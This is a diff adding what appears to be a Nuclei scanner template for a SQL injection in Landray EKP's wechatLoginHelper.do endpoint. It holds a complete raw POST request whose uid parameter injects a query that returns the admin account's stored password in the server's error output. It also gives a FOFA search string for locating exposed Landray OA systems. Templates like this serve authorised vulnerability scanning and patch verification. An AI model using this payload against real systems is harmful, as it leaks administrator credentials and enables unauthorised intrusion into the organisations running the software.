@@ -1,0 +1,39 @@
+id: landray-wechat-loginhelper-sqli
+
+info:
+  name: 蓝凌 EKP wechatLoginHelper SQL 注入
+  author: zan8in
+  severity: high
+  description: |
+    蓝凌 EKP /third/wechat/wechatLoginHelper.do 的 uid 参数可报错注入，响应回显 SQLException 与探测字符串。
+  reference:
+    - https://mp.weixin.qq.com/s/vwJjmb_Im6Z7-2EVSfY5-g
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="Landray-OA系统"
+  tags: landray,ekp,sqli
+
+variables:
+  randstr: "{{rand_base(8)}}"
+
+http:
+  - raw:
+      - |
+        POST /third/wechat/wechatLoginHelper.do HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        method=edit&uid=1'and+(SELECT+fdPassword%2B'----{{randstr}}'+FROM+com.landray.kmss.sys.organization.model.SysOrgPerson+where+fdLoginName='admin')=1+and+'1'='1
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "java.sql.SQLException"
+          - "{{randstr}}"
+        condition: and
+      - type: status
+        status:
+          - 200
